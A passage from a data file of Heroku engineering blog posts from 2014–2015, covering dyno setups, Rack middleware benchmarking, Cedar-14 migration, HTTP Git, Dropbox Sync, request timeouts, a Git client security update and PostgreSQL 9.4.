mean value.\nm := instruments.Mean(s) It also provides an optional registry to ease the collection of multiple metrics and a built-in logfmt reporter: registry := reporter.NewRegistry()\nregistry.Register(\"requests-size\", sizes)\n// Report in logfmt format every minute.\ngo reporter.Log(\"dyno.1\", registry, time.Minute) But instruments is not opinionated about how metrics should be reported,\nit could also be avoided altogether by using values directly to trigger a circuit-breaker, a health-check, etc. It will still give you the flexibility to choose what and how you send metrics to something like Graphite , Librato , InfluxDB , or similar. You can define which instruments and which value you sent them to avoid overwhelming the underlying system with useless data or for cost control: registry := instruments.NewRegistry()\nfor k, m := range registry.Instruments() {\n  switch i := m.(type) {\n  case instruments.Discrete:\n    s := i.Snapshot()\n    report(k, s)\n  case instruments.Sample:\n    s := i.Snapshot()\n    p95 := instruments.Quantile(s, 0.95)\n    report(fmt.Sprintf(\"%s.p95\", k), p95)\n    p99 := instruments.Quantile(s, 0.99)\n    report(fmt.Sprintf(\"%s.p99\", k), p99)\n  }\n} If you want to give it a try today, contribute or report bugs, then check out the project on Github. tools", "date": "2014-10-22,"},
{"website": "Heroku", "title": "Django and Node together on Heroku", "author": ["David Gouldin"], "link": "https://blog.heroku.com/heroku-django-node", "abstract": "Django and Node together on Heroku Posted by David Gouldin October 28, 2014 Listen to this article Heroku Connect is written primarily in Python using Django. It's an add-on and a platform app, meaning it's built on the Heroku platform. Part of our interface provides users with a realtime dashboard, so we decided to take advantage of socket.io and node.js for websocket communication. But like all Heroku apps, only one type of dyno can serve traffic. This left us with two choices: manage 2 apps, each with its own repo, and carefully consider when and how we deployed them, or find a way to serve both node and Django traffic from the same app. Luckily, fellow Herokai Dan Peterson had already created a buildpack specifically for running mutiple processes in the same dyno, managed by runit . Using its \"sub-Procfile\" format, we were able to run node and Django in the same dyno. Of course, still only 1 process on the web dyno can bind to PORT . By adding an environment variable (we called it DJANGO_PORT ) and adding node-http-proxy to our node script, we were able to bind node to PORT and proxy all normal web traffic through to Django over 127.0.0.1 . The resulting Procfiles look something like this: Procfile: web: bin/runsvdir-dyno Procfile.web: django: gunicorn path.to.wsgi:application --bind 127.0.0.1:$DJANGO_PORT\nnode: node server.js This solution comes with its own set of challenges. Web dynos now face greater resource contention than either a Django or node dyno would on its own. All processes on a dyno share memory, CPU, and a single filesystem, so choose your dyno type with care. Since bin/runsvdir-dyno exists only in the buildpack and not in our repo, we \"flattened out\" our Procfiles into a single file we called Procfile.local in order to continue to use Foreman for local development. Logs on the web dynos become slightly less useful as web.1 no longer provides the context needed to map a log line to its source process. This is easily corrected by prefixing loggers in Django and node, but it something to consider. We've been running this architecture in production without issue for a few months now. The simplicity of a single git push deploy is a big win, and the overhead involved in proxying Django requests is minimal compared even to the speed of a Django \"hello world\". The change is completely transparent to our users, but it gives us the building blocks we need to easily add websocket communication to our Django Heroku app. django node", "date": "2014-10-28,"},
{"website": "Heroku", "title": "Benchmarking Rack Middleware", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/benchmarking-rack-middleware", "abstract": "Benchmarking Rack Middleware Posted by Richard Schneeman November 02, 2014 Listen to this article Performance is important, and if we can't measure something, we can't make it fast. Recently, I've had my eye on the ActionDispatch::Static middleware in Rails. This middleware gets put at the front of your stack when you set config.serve_static_assets = true in your Rails app. This middleware has to compare every request that comes in to see if it should render a file from the disk or return the request further up the stack. This post is how I was able to benchmark the middleware and give it a crazy speed boost. How ActionDispatch::Static Works Right now to serve static files Action Dispatch hits the disk, basically doing this on every request: Dir[\"#{full_path}#{ext}\"].detect { |m| File.file?(m) } My gut said there had to be a better way, but how do we measure a singular rack middleware's performance? I couldn't find any really good posts on it, so I improvised using benchmark/ips and Rack::MockRequest to simulate traffic. Bootstrap your Middleware First you need to load the file where your middleware is defined: require 'rack/file'\nrequire 'action_controller'\nload '/Users/schneems/Documents/projects/rails/actionpack/lib/action_dispatch/middleware/static.rb' Now we need to load our test capabilities: require 'rack/test' Now we can instantiate a new object that we can call in isolation: noop       = Proc.new {[200, {}, [\"hello\"]]}\nmiddleware = ActionDispatch::Static.new(noop, \"/my_rails_app/public\")` Then we wrap it up in a mock request: request = Rack::MockRequest.new(middleware) I wanted to compare the speed of the middleware with the speed of the proc that it hits, so I made a no-op mock request as well: noop_request = Rack::MockRequest.new(noop) Now, if we want to exercise a request against our singular middleware we can call request.get(\"/path_i_want_to_hit\") Run your Benchmarks To do the comparison you'll need the benchmark ips gem installed $ gem install benchmark-ips The gem works by running different blocks of code for variable amounts of time to record how many iterations per second they can achieve. The higher the number, the faster the code. We set up our benchmark: require 'benchmark/ips'\n\nBenchmark.ips do |x|\n  x.config(time: 5, warmup: 5)\n  x.report(\"With ActionDispatch::Static\") { request.get(\"/\")  }\n  x.report(\"With noop\")                   { noop_request.get(\"/\") }\n  x.compare!\nend You should get an output similar to this: Calculating ----------------------------------With ActionDispatch::Static\n                          1525 i/100ms\n           With noop      2667 i/100ms\n----------------------------------------------With ActionDispatch::Static\n                        15891.2 (±11.6%) i/s -      79300 in   5.056266s\n           With noop    28660.9 (±11.7%) i/s -     141351 in   5.009789s Higher iterations are better, so the blank no-op middleware was (28660.9 - 15891.2)/15891.2 * 100 #=> 80 roughly 80% faster or ran 80% more operations than with the default ActionDispatch::Static . This is expected, but only gives us a baseline. So, we still need to test our new code. Comparing Benchmarks I ran the tests a few times to ensure I wasn't getting any flukes. Then, I set it up so that the middleware had some optimizations to not hit the disk were incorporated: Calculating ----------------------------------Modified ActionDispatch::Static\n                          2330 i/100ms\n           With noop      2422 i/100ms\n----------------------------------------------Modified ActionDispatch::Static\n                        24490.9 (±7.9%) i/s -     123490 in   5.081158s\n           With noop    26870.1 (±8.7%) i/s -     135632 in   5.093423s Here you can see that our no-op code ran (26870.1 - 24490.9)/24490.9 * 100 # => 9.71 roughly 10% faster than the default ActionDispatch::Static . Here the closer the better as the nooop is the fastest possible case. When we graph the results You can see that my slight optimizations got us pretty close to the optimal state. The tick marks on each bar show the standard deviation (the ±) to make sure that the numbers are somewhat sane. If we do the math, we can see that my new middleware is (24490.9 - 15891.2)/15891.2 * 100 # => 54.11 or roughly 54% faster than the original ActionDispatch::Static in the case when we're making a request that is not requesting a file. Keep it in Context Make sure not to get tunnel vision when you're benchmarking, in this case my optimizations made all non-asset requests faster, but since that required more logic, it actually makes asset requests (i.e. request.get(\"assets/application-a71b3024f80aea3181c09774ca17e712.js\") ) slightly slower. Luckily, I did some benchmarking there and found the difference to not really be measurable. Either way, don't just benchmark your happy path, make sure to benchmark all common conditions. Right now you might also be thinking \"Holy cow 54% speed improvement in Rails, zOMG!\" but you have to remember that this is a middleware tested in isolation. The performance improvement isn't as much when we compare it to the whole Rails application stack, which I had to benchmark as well (and is a whole different blog post). The end result came to a ~2.6% overall speedup with the new middleware. Not bad. Here's the PR to Rails: https://github.com/rails/rails/pull/16464 . Go forth and benchmark your Rack middleware! If you have any feedback or know of a different/better way to do this, find me on the internet @schneems . performance", "date": "2014-11-02,"},
{"website": "Heroku", "title": "Cedar-14 now Generally Available", "author": ["Michael Friis"], "link": "https://blog.heroku.com/cedar_14_now_generally_available", "abstract": "Cedar-14 now Generally Available Posted by Michael Friis November 04, 2014 Listen to this article We’re excited to announce that the Cedar-14 – the new version of the Celedon Cedar stack – is ready for general availability and is now the default stack on Heroku. Cedar-14 is based on the latest Ubuntu LTS Linux version and comes with a modern set of libraries and system dependencies that will stay current and updated for a long time to come. Since we announced the public beta of Cedar-14 three months ago, we have migrated most of the apps that we run on Heroku to Cedar-14 (yes, a lot of Heroku runs on the Heroku platform) and thousands of users have also moved apps or created new Cedar-14 apps. We have worked with these early adopters and with buildpack maintainers to weed out bugs and problems. Cedar-14 is now stable and ready for production apps. Read on to learn how to migrate apps to Cedar-14 and for details on future stack updates on Heroku. Updating apps to Cedar-14 Before migrating a Heroku app to Cedar-14, we recommend testing your app source code on Cedar-14, either by upgrading an existing staging app or by creating a new staging app on Cedar-14. To migrate an existing app to Cedar-14, use the stack command: $ heroku stack:set cedar-14 -a example-app\n…\n$ git commit -m \"update to cedar-14\" --allow-empty\n…\n$ git push heroku master\n… Note that running stack:set only tells Heroku that you want the next push built and deployed on Cedar-14. You have to push and force a rebuild for the change to take effect. See the full Migrating to Cedar-14 Dev Center article for additional details. If, in spite of testing, your app doesn’t work correctly on Cedar-14, you can always roll back to revert the stack change: $ heroku rollback Note that this will cause the apps stack to be reset to cedar and you need to re-run stack:set cedar-14 to deploy to Cedar-14. What to look out for We have worked hard to make migrating to Cedar-14 as smooth as possible, but there are a few things to look out for. Stack image libraries When putting together Cedar-14, we have strived to make it backwards compatible with the old Cedar stack. To reduce stack surface area and the frequency of potentially disruptive stack updates, we have, however, removed some lesser used packages from Cedar-14. Apps may also encounter incompatibilities simply because most libraries on Cedar-14 have been updated to their most recent versions. A full declaration of Cedar and Cedar-14 packages is available on Dev Center. Memory use One of the most significant package differences between Cedar and Cedar-14 is the glibc versions available. Our testing has found that some programs consume more memory on Cedar-14. This change is related to how address space is managed across threads in newer glibc versions. The Cedar-14 migration guide has more details, but in general, we recommend that you monitor app memory use during the migration to Cedar-14 (using the new Dashboard Metrics for example) and that you check for R14 memory errors after the migration. Buildpack support for Cedar-14 Buildpacks are the scripts that transform your source code into slugs that run on the Heroku platform. Buildpacks often pull in binary dependencies that are specific to a particular stack and for that reason, they generally have to be made stack-aware. We have updated all of the default buildpacks maintained by Heroku and we have have worked with maintainers of popular third-party buildpacks to get as many of those as possible updated too. If you find that a third-party buildpack you’re using doesn’t work on Cedar-14, we recommend that you reach out to the maintainer or that you move to a Heroku-supported buildpack. If you’re a buildpack maintainer, please refer the Buildpack API article for details on how to support multiple stacks. Stack future Cedar-14 is now the default stack on Heroku and we recommend you use that stack for new apps. If you need to create Cedar apps for testing purposes, you can still do so by passing --stack cedar when creating apps. Stacks cannot live forever – packages and distro versions are deprecated or stop receiving security updates. With Cedar-14 GA, we’re also announcing the deprecation of the classic Cedar runtime stack: A year from now, on November 4th, 2015, the classic Cedar stack will be retired and any apps that have not been migrated to Cedar-14 will stop running. You must migrate all apps to Cedar-14 before this date to prevent disruption in availability. In the coming year, we will keep the old Cedar stack image patched and updated. We know that Heroku users want stacks that are stable and have modern packages and libraries, and that’s why we currently base stacks on Ubuntu Linux LTS releases. We think Canonical and the Ubuntu community strike a great balance between stability and frequent updates with biennial LTS releases, and we plan to track those releases when we release new Heroku stacks. A well-defined stack lifecycle policy is critical to keeping apps on Heroku patched secure. For additional details on how Heroku thinks about stacks and how we keep stacks updated, please refer to our Stack Image Update Policy on Dev Center.", "date": "2014-11-04,"},
{"website": "Heroku", "title": "Announcing HTTP Git Beta", "author": ["Michael Friis"], "link": "https://blog.heroku.com/announcing_http_git_beta", "abstract": "Announcing HTTP Git Beta Posted by Michael Friis November 06, 2014 Listen to this article Of the many Platform-as-a-Service innovations Heroku has contributed in its seven year existence, perhaps the most iconic is git push heroku master . Today we’re announcing a significant upgrade to Heroku’s Git implementation: Beta support for Git’s HTTP transport. HTTP Git has some notable advantages over traditional SSH Git. Instead of relying on port 22 (often blocked by firewalls) HTTP Git runs on port 443, the same port used for secure web requests. Also, HTTP Git uses a simpler authentication model than SSH Git, and is easier to set up. Many new users struggle with the tooling and configuration required to configure git-push over SSH, especially on Windows. HTTP Git uses Heroku API tokens for authentication, and Heroku Toolbelt takes care of setup and configuration so that you’re not prompted for your password on each push. See the Authentication section on Dev Center for details on how auth is managed. How to use HTTP Git Heroku Toolbelt has been updated and can be used to configure Git remotes that use HTTP. While in beta, you get HTTP by passing the --http-git flag to the relevant heroku apps:create , heroku git:clone and heroku git:remote commands. To create a new app and have it be configured with a HTTP Git remote, run this: $ heroku apps:create --http-git To change an existing app from SSH to HTTP Git, simply run this command from the app’s directory on your machine: $ heroku git:remote --http-git\nGit remote heroku updated Check out the Dev Center documentation for details on how set up HTTP Git for Heroku . Git and Heroku The idea that Git can be used to deploy code to production is profound: It takes a process that you use many times a day to sync source code with collaborators, and applies it to deployments. This means that you don’t have to break flow and use different and unfamiliar tools to deploy. The result is that you’ll tend to deploy smaller changes more frequently (as opposed to giant, infrequent deploys), and that makes deploys less risky and bugs easier to identify and fix. And because deployments derive directly from your revision control system, it’s very simple to determine what code is running on production. Simply run git checkout <deployed-commit> and you can start to reproduce a production issue with your app locally. We’re very happy with the HTTP Git experience we’re launching into beta today, and we feel it’s on par or better than SSH Git across all the operating systems that Heroku supports. Once HTTP Git is out of beta, we expect to make it the default Heroku Git mode. If you have feedback or suggestions for HTTP Git on Heroku, then don’t hesitate to get in touch on http-git-feedback@heroku.com .", "date": "2014-11-06,"},
{"website": "Heroku", "title": "Announcing A Very Ruby Thanksgiving", "author": ["Matthew Creager"], "link": "https://blog.heroku.com/very-ruby-thanksgiving", "abstract": "Announcing A Very Ruby Thanksgiving Posted by Matthew Creager November 10, 2014 Listen to this article We’re very excited that our Heroku colleagues Matz, Nobu and Ko1 will all be visiting from Japan soon to attend RubyConf, and it’s especially serendipitous that it is happening in such close proximity to Thanksgiving. Not only is Thanksgiving one of the few holidays that Japan and the U.S. share, it’s a holiday that brings families together to reflect on what’s been accomplished, and to share insight into the future. We've been waiting for just the right opportunity to organize a small Ruby gathering and Thanksgiving provides the perfect setting. \"I hope to see Ruby help every programmer in the world to be productive, to enjoy programming, and to be happy.  That is the primary purpose of the Ruby language.\" - Yukihiro \"Matz\" Matsumoto On November 20, Heroku is proud to host a ‘A Very Ruby Thanksgiving,’ featuring Yukihiro \"Matz\" Matsumoto, the creator of Ruby and Heroku's Chief Ruby Architect.  Matz will discuss what the future has in store for Ruby in his community address before being joined by Ruby Core members Nobuyoshi \"Nobu\" Nakada, and Koichi \"Ko1\" Sasadar for an open fireside chat. The fireside will include a community Q&A and be moderated by Terence Lee, a member of the core Bundler team. If you’re a Ruby developer in the Bay Area -- or can get here -- we’d love to welcome you to our family and our offices for the evening. Let’s come together, enjoy each other’s company, and look to what lies ahead for Ruby. Hugs are free, but space is limited.  You can register and find more information on the event page . ruby events", "date": "2014-11-10,"},
{"website": "Heroku", "title": "Heroku External Objects: Bringing Native Postgres to Salesforce ", "author": ["Margaret Francis"], "link": "https://blog.heroku.com/heroku-external-objects", "abstract": "Heroku External Objects: Bringing Native Postgres to Salesforce Posted by Margaret Francis November 13, 2014 Listen to this article Today we are announcing a new data solution for combined users of the Heroku and Salesforce platform: Heroku External Objects.  The newest feature of Heroku Connect, Heroku External Objects makes data from any Heroku Postgres database - like that from customer apps, transaction systems, or data warehouses-  seamlessly available within a given Salesforce deployment.  Leveraging the newly announced Salesforce1 Lightning Connect , Heroku External Objects gives Force.com developers a powerful new capability to help architect their Salesforce deployments and implement data services. Heroku Postgres + Force.com Every Force.com developer is familiar with the powerful database services the platform provides.  Being able to easily add fields and objects, and relate them, has been at the center of the platform’s power for almost a decade.  As developers bring Force.com into new and increasingly more demanding use cases, the ability to integrate different classes of data into a single deployment is very useful. With Heroku External Objects, data persisted in Heroku Postgres can now be presented as a kind of “virtual” Custom Object. From the end user’s perspective, the data is presented just like any other Custom Object.  But on the backend, the data is persisted only in Heroku Postgres.  This makes the full capabilities of Postgres - such as large data volumes, SQL accessibility, and app development support - available to a Heroku External Object, while retaining its visibility within Salesforce. This difference also means understanding some limitations. Unlike Custom Objects the Heroku External Object data is read only, and not available in reports. It can be searched, used in Apex and Visual Force pages, and retrieved via the Force.com APIs. Taken together, Heroku External Objects, the existing synchronization capabilities of Heroku Connect, and the existing Custom Objects features of Force.com provide developers with a powerful palette of data services for their Salesforce deployments. Heroku External Objects and Lightning Connect Heroku External Objects works in tandem with Lightning Connect.  Under the hood, Lightning Connect uses the oData standard to let data from any oData enabled source be easily presented inside of Salesforce. Lightning Connect already has support from significant members of the integration ecosystem. Heroku External Objects is available today with Heroku Connect.  To see how our customers build Salesforce connected apps with Heroku and Heroku Connect, join us for a webinar with Sharon McHugh, VP Sales, Innisbrook on December 16th.  For more information and documentation, visit the Heroku Connect page , the Heroku Dev Center or the documentation on Force.com . HerokuConnect Force.com salesforce", "date": "2014-11-13,"},
{"website": "Heroku", "title": "Announcing Beta Dropbox Sync", "author": ["Michael Friis"], "link": "https://blog.heroku.com/announcing_beta_dropbox_sync", "abstract": "Announcing Beta Dropbox Sync Posted by Michael Friis November 19, 2014 Listen to this article Helping teams to collaborate on creating, shipping and operating great apps is a core Heroku value. People collaborating on Heroku apps are not all alike: Some spend all day in the terminal, others prefer using Heroku from a browser. That’s why we’ve built both a powerful CLI and a great Dashboard . Today, we’re adding beta support for Dropbox Sync to complement Git-based deployments. By adding Dropbox as a way to sync changes, we’re making it easier for more users on diverse teams to contribute to apps built on Heroku. Git is a powerful tool for software developers to collaborate on building great apps and software. We added Git-based deployments 6 years ago , to plug Heroku straight into that collaboration flow and to make deploying to production as simple as sharing changes with your collaborators. With Dropbox Sync, we’re inviting more people to participate in the process of creating great apps and we’re giving existing users more choice and flexibility in how code is deployed to Heroku. Read on for details. How to Deploy with Dropbox Getting set up with Dropbox deploys is incredibly simple and can be done from the comfort of a browser window. You can enable Dropbox Sync for both new apps and for existing apps that have existing releases created with Heroku Button or with Git. Setup is done on the Code tab of an app and requires granting Heroku access to your Dropbox account. Note that Heroku will NOT have access to all the files and folders in your Dropbox account: Heroku’s access is limited to a special /Heroku subfolder. Once setup is complete, a sub-folder will be created for the app in the /Apps/Heroku folder (the name of your /Apps folder may be localized). This is where source code for the app lives. If you enable Dropbox for an existing app that already has releases, Heroku will place the contents of the app’s Git repo into the Dropbox folder and you can start hacking right away. Whenever you want to deploy your local changes to Heroku, simply enter a commit message and hit the “Deploy” button in Dashboard. Use the message to summarize in a few words what you have changed since the last deploy. Heroku will now fetch the latest version of your source code from Dropbox and kick off a build. You can immediately follow build progress and you can track progress and debug build errors from the “Activity” tab of the app. Collaboration Working together to create and operate apps is a core value of Heroku and one of the original motivations for building Git-based deployments. When designing and building Dropbox Sync, we worked hard to integrate the new feature into how source code is managed on the platform. If you’re part of a development team where some use Git and others want to use Dropbox, fear not. Changes shipped with Dropbox are available to Git collaborators with a simple git pull and git push updates are automatically synced to connected Dropbox folders. If an app has multiple users deploying with Dropbox, the latest changes are synced to all connected Dropbox folders whenever a new app release is created. See Dev Center for details on how collaboration and conflict resolution works . Git and Dropbox can be combined even if it’s just you working on an app. For example, you might do your day-to-day development on a laptop, pushing changes with Git. Later, if you need to make changes at a time and place where all you have is your iPad, no problem: simply open your code in a Dropbox-enabled editor, fix the problem, hit the “Deploy” button in Dashboard and you’re done. Looking ahead We’re excited about this beta and we’re very keen on getting your feedback. If you try out Dropbox Sync and encounter any problems or have suggestions or ideas, don’t hesitate to get in touch on dropbox-sync@heroku.com . We’re also really excited about the prospect of opening up Heroku to more kinds of developers. We’re working hard to ship new ways to get code onto Heroku: Both low-level APIs like the Build API and higher level services, like Dropbox Sync and Heroku Button built on those APIs. Have ideas for other ways we should support moving source code to Heroku in addition to Git and Dropbox? Let us know or spike out your own prototype using the Build API .", "date": "2014-11-19,"},
{"website": "Heroku", "title": "Introducing the General Availability of Performance Dynos in Europe", "author": ["Jesper Joergensen"], "link": "https://blog.heroku.com/general-availability-of-performance-dynos-in-europe", "abstract": "Introducing the General Availability of Performance Dynos in Europe Posted by Jesper Joergensen December 04, 2014 Listen to this article Since day one, developers from all over the world have been deploying apps on Heroku, and we’re extremely proud of the strong global community we’ve built. Our European customers in particular have asked for the ability to deploy applications geographically close to their European customer base so they can offer a better user experience with more responsive apps. In 2013 we launched 1X and 2X dynos in Europe to meet this demand. Today we’re pleased to announce the general availability of Performance Dynos in our European region. The availability of Performance Dynos in Europe provides the flexibility needed to build and run large-scale, high-performance apps. Performance Dynos are highly isolated from workloads in other dynos and contain 12 times the memory of a single Heroku Dyno, resulting in significantly faster and more consistent response times. Deploying apps in the Heroku EU region can reduce latency by 100ms or more for European users, improving responsiveness and application experience. With the launch of Performance Dynos in Europe, highly scaled apps can reach even greater improvements. We also have 110 Heroku Add-ons available in the EU region to extend application functionality. All these EU region services are managed by the same unified Heroku interface that you are already familiar with, and there is no difference in pricing from our US region. Growth of Heroku in Europe Ranging from small EU-based startups to international Fortune 500 enterprises, we’ve seen strong adoption of Heroku in Europe. In 2014, the number of apps deployed in Heroku’s Europe Region increased by nearly 180%. This includes great companies like Toyota Motor Europe and Sweden’s largest commercial television company, TV4 . When the TV4 team moved their first web apps from the US region to the European region, they immediately saw 150 ms improvements in web performance. Today, TV4 deploys all their Heroku apps to the EU region and are taking full advantage of Performance Dynos to deliver the very best user experience to their customers. It is more important than ever to build responsive apps that react to customer actions in milliseconds. Heroku is committed to sustained investment in Europe and beyond to ensure that you have the geographic deployment options you need to meet this goal. Additional Resources: Dev Center: Regions Dev Center: Migrating an App to another Region Dev Center: Configure SSL for Europe Region Apps", "date": "2014-12-04,"},
{"website": "Heroku", "title": "Time Out Quickly", "author": ["Damien Mathieu"], "link": "https://blog.heroku.com/timeout-quickly", "abstract": "Time Out Quickly Posted by Damien Mathieu December 04, 2014 Listen to this article Working with our support team, I often see customers having timeout problems. Typically, their applications will start throwing H12 errors. The decision to timeout requests quickly wasn't made to avoid having long-running requests on our router, nor to only have fast apps on our platform, but because standard web servers do not handle these types of requests particularly well. How webservers work All webservers will work in a similar way. Any new request will go to a queue, and the server will process them one after the other. This means if you have 30 requests in your queue, each taking 1 second to be processed, that will take 30 seconds for your server to empty the queue. If one of those requests is a file upload for example and takes 5 minutes to be processed, it means that any other request will be stuck for 5 minutes. That's 5 minutes during which no one else can visit your app. In standard servers, you would start multiple processes and setup a HAProxy in front of them. If you're familiar with our stack, this architecture will look quite familiar to you, as it is exactly what our router does. This means if you need to start new processes to handle more requests, you just have to start more dynos. Of course, dynos can handle more than one process at a time, when using a concurrent web server, such as Unicorn in ruby , node's Cluster , or python's Gunicorn . All these solutions are small workarounds to face a real problem though. Standard web servers don't scale with long-running requests. Knowing this should be among the top things in your mind when architecting a web application. Because of this, you probably don't want to do long things in your web process, at the risk of having bad performance. How do I perform long-running actions then? There are two kind of different long-running actions, both with different solutions. Slow actions Even with a web server able to handle long-running requests properly, you probably wouldn't want to handle slow actions in your web process. These actions can be processing a video, generating a PDF, or thumbnails for an image and other actions that use a lot of memory or CPU and will take more than a few milliseconds to execute. You will want to execute those requests asynchronously in a background process . As it's name states, this process will be running in the background, which means it won't accept web requests, and will only handle actions unseen from the client. File uploading Uploading a file can take a lot of time, and you can't control that time, as it can be slower if the client's connection is bad. File storage services like Amazon S3 or Google Cloud Storage will let you specify Cross-Origin Resource Sharing headers, which will let you perform javascript uploads directly to their service. This means your web app can upload a file to a third-party service without ever hitting your server, preventing any long-running request and delegating all the slow upload to an app dedicated to that. Once that upload is done, you would only have to send the uploaded file's name to your app, which will then be able to do whatever it needs with it. Move it to a secure location; generate thumbnails etc. And if I want to go beyond those 30 seconds anyway? Building programs is a lot of fun because you alway find edge cases where you will need and want to have a long-running request.\nWhat, for example, if you're waiting for a PDF to have finished generating before sending it to the client. You could perform requests every 10 seconds to check the status of your PDF. Or you could keep a long-running connection with your server and be notified as soon as the PDF is generated. Furthermore, technologies like Node.js and Go are specifically designed for running concurrent connections, which means they are perfectly able to scale even with a lot of long-running requests. The way to go here is by opening a websocket . On our platform, WebSockets are following the specification as much as they can. Which means you can open a long-running connection, which will stay open until it is closed either by the server or the client, or it has 55 seconds of inactivity. This means we can keep a connection open as long as we want, on the condition that we feed it data regularly. No browser can open a direct WebSocket connection though. It has to happen in javascript, which means all your standard pages loaded will still need to respond in less than 30 seconds. Conclusion Avoiding long-running requests will allow you to get better performance on your app and scale it more easily. Unfortunately, there is no generic way for our router to let your application know when we have responded to a request with an H12. This means an app with a very long queue could end up in a state where all requests are H12 because your app doesn't even have the time to get to it in 30 seconds. This can be mitigated quite easily in ruby with rack-timeout , or in node with expressjs' timeout . These libraries will raise an exception in your app if a request takes longer than a few seconds to execute (we recommend not setting a value higher than 10 seconds). This way, requests stay too long in their queue will be killed much faster, avoiding that state of perpetual H12 errors. performance", "date": "2014-12-04,"},
{"website": "Heroku", "title": "HTTP Git now Generally Available", "author": ["Michael Friis"], "link": "https://blog.heroku.com/http_git_now_generally_available", "abstract": "HTTP Git now Generally Available Posted by Michael Friis December 05, 2014 Listen to this article Today we’re happy to announce that the HTTP Git beta is over and that HTTP Git is fully ready for production. The beta was launched less than a month ago and we are already handling thousands of HTTP Git builds per day. In addition, HTTP Git powers the Dropbox Sync beta, making sure that Dropbox folders and Heroku repos are up-to-date. Over the past month, we have seen great adoption from partners, and Travis CI is using HTTP Git as the default git strategy for Heroku deployments. We encountered few issues during the beta, and we’re confident that HTTP Git is the best Git implementation for most Heroku users. For that reason, we’re making HTTP Git the default setup when repos are configured by Heroku tooling. We will keep SSH Git as an option and SSH Git still works for all repos on Heroku. You can use SSH Git and HTTP Git (and Dropbox Sync) interchangeably as needed by you and your collaborators. Read on for details. With HTTP Git now the default, heroku create , heroku git:remote and heroku git:clone commands all configure your local environment to use HTTP Git. If, for any reason, you want to use SSH Git with a particular app, simply pass a --ssh-git flag to these commands, e.g.: $ heroku create --ssh-git If you want to always use SSH Git with Heroku on a particular machine, you can add the following global config: git config --global url.ssh://git@heroku.com/.insteadOf https://git.heroku.com/ HTTP URLs will still be written to .git folders but Git will rewrite, on the fly, all Heroku HTTP Git URLs to use SSH. See the Git documentation for details for details, including instructions on how to remove this setting. If you have any feedback on HTTP Git on Heroku, don’t hesitate to send us an email at http-git-feedback@heroku.com .", "date": "2014-12-05,"},
{"website": "Heroku", "title": "Update Git clients on Windows and OS X", "author": ["Michael Friis"], "link": "https://blog.heroku.com/update_your_git_clients_on_windows_and_os_x", "abstract": "Update Git clients on Windows and OS X Posted by Michael Friis December 23, 2014 Listen to this article Last week, a security fix was released for Git . The fix patches a bug in the Git client that is exploitable on operating systems with case insensitive file systems such as Windows and OS X. Heroku has updated the Git installer that we ship with Toolbelt for Windows. We have also removed an old Git version from the OS X installer (it was not generally used). In addition, we’ve added a Git version warning in Toolbelt that will prompt you to update Git if you’re using a vulnerable version on Windows (shown here) or OS X: $ heroku apps\nWARNING: Your version of git is 1.9.3. Which has serious security vulnerabilities.                                               \nMore information here: https://blog.heroku.com/archives/2014/12/23/update_your_git_clients_on_windows_and_os_x Heroku Toolbelt ships msysGit for Windows and users should update to 1.9.5, available from the msysGit website . OS X users should update their system Git using, for example, the OS X installers or using Homebrew . Details of the exploit are available on the Git Blame blog and from the Git mailing list announcement .", "date": "2014-12-23,"},
{"website": "Heroku", "title": "PostgreSQL 9.4 Now Available on Heroku", "author": ["Peter van Hardenberg"], "link": "https://blog.heroku.com/postgres-9-4-on-heroku", "abstract": "PostgreSQL 9.4 Now Available on Heroku Posted by Peter van Hardenberg January 08, 2015 Listen to this article Each major release of PostgreSQL brings lots of great new functionality. The recent release of PostgreSQL 9.4 includes an exciting new JSON data type, improvements to window functions, materialized views, and a host of other performance improvements and enhancements. We’ll go into more depth on what’s new and exciting in this release below, but first, we want you to know that Postgres 9.4 is available in beta right now on Heroku: $ heroku addons:add heroku-postgresql --version=9.4 Because the safety and reliability of your data is incredibly important to us, we’re launching 9.4 support in a beta state. This means that customers looking to follow the bleeding edge and get the first access to new features can get started with Postgres 9.4 right now. Customers who are content with what they have right now should continue to use 9.3 for new databases until  9.4 matures and we make support generally available. JSONB Dramatically Improves JSON Performance Postgres combines the performance and flexibility of a modern document store with the kind of durability and power found in a more traditional RDBMS. Indeed, Postgres has offered native support for JSON for several years now . With each release, that support has seen significant improvements. The 9.3 release introduced JSON operators that allow JSON subdocuments to be queried. This release builds on that work by revising the underlying storage of JSON data to a more efficient binary format. The new JSONB data type (the \"b\" stands for binary) brings significant performance improvements. Previously, JSON data was stored as raw text that required re-parsing with every access. The new JSONB format looks and feels just like normal JSON to the user, but it is parsed only once (on insert) after which it is stored in a specialized binary format. This makes querying and processing much faster. Most exciting, JSONB supports GIN indexes . These indexes provide a \"universal\" index, which allows you to efficiently execute a wide variety of queries. This is in contrast to other databases which require a separate index to be manually created for each query you want to optimize. You can: CREATE INDEX idx_users_preferences ON users USING gin (preferences); JSONB has received quick attention from the language ecosystem, including Ruby support through Active Record in Rails 4.2 , and Python support as of SQLAlchemy 0.9.7 . Other Improvements There are a number of other noteworthy improvements: Refreshing a materialized view can be performed without blocking reads to it. Numerous performance improvements , including faster aggregate functions used as window functions . GiST indexes now support the inet and cidr data types (these are Postgres’ native data types for storing IPv4 and IPv6 addresses). Heroku Postgres Version Support Policy As described above, Heroku currently supports Postgres 9.4 as a beta. We encourage users to wait for GA before adopting 9.4 for production applications, and new databases are not provisioned with 9.4 by default, but only with the --version flag. All databases provisioned with Postgres 9.4 are billed at our standard prices and Postgres 9.4 is available on all plans. Once we feel confident that Postgres 9.4 is stable - based on both Heroku customers’ experience as well as monitoring community discussions - we will make it available in GA and promote it to become the new default. In keeping with our versioning policy of maintaining three major releases, some time after Postgres 9.4 becomes the default, Postgres 9.1 will be deprecated. PostgreSQL 9.4 on Heroku Postgres was Built for You Postgres 9.4 is an exciting release, and we hope that this early opportunity to use it in beta will encourage you to start taking advantage of its features immediately. This new release is shaped in part by you! We take all the great feedback and input from our users and use that to help drive our contributions to Postgres each year. In fact, several of the new features in 9.4 were contributed by our team and inspired directly by your needs. As usual, every Heroku Postgres database comes with additional features according to its plan, including dataclips , performance analytics , pg:diagnose and encryption at rest . We will continue to invest in making your applications a success on Heroku Postgres by adding new features, tuning your database performance, improving visibility, safeguarding your data and keeping your database running so you can sleep well at night. postgres 9.4 json jsonb", "date": "2015-01-08,"},
